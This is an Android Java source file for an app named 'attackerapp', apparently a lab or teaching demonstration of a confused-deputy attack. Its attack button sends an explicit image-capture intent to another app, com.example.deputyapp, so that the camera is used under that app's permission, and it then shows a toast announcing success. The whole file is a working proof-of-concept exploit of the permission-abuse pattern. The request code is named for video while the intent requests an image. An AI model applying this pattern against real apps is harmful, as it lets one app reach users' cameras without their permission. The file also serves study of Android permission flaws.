package com.example.attackerapp;

import android.content.ComponentName;
import android.os.Bundle;
import androidx.appcompat.app.AppCompatActivity;
import android.view.View;
import android.widget.Button;
import android.widget.Toast;
import android.content.Intent;

import android.provider.MediaStore;

public class MainActivity extends AppCompatActivity {

    private static final int REQUEST_VIDEO_CAPTURE = 101;

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_main);

        Button exploitButton = findViewById(R.id.attack_button);
        exploitButton.setOnClickListener(new View.OnClickListener() {
            @Override
            public void onClick(View v) {
                exploitDeputyAppCameraPermission();
            }
        });
    }

    private void exploitDeputyAppCameraPermission() {
        Intent intent = new Intent(android.provider.MediaStore.ACTION_IMAGE_CAPTURE);
        intent.setComponent(new ComponentName("com.example.deputyapp", "com.example.deputyapp.MainActivity"));
        startActivityForResult(intent, REQUEST_VIDEO_CAPTURE);
    }

    @Override
    protected void onActivityResult(int requestCode, int resultCode, Intent data) {
        super.onActivityResult(requestCode, resultCode, data);
        if (requestCode == REQUEST_VIDEO_CAPTURE && resultCode == RESULT_OK) {
            Toast.makeText(MainActivity.this, "Video captured using Deputy App's camera permission", Toast.LENGTH_SHORT).show();
        }
    }
}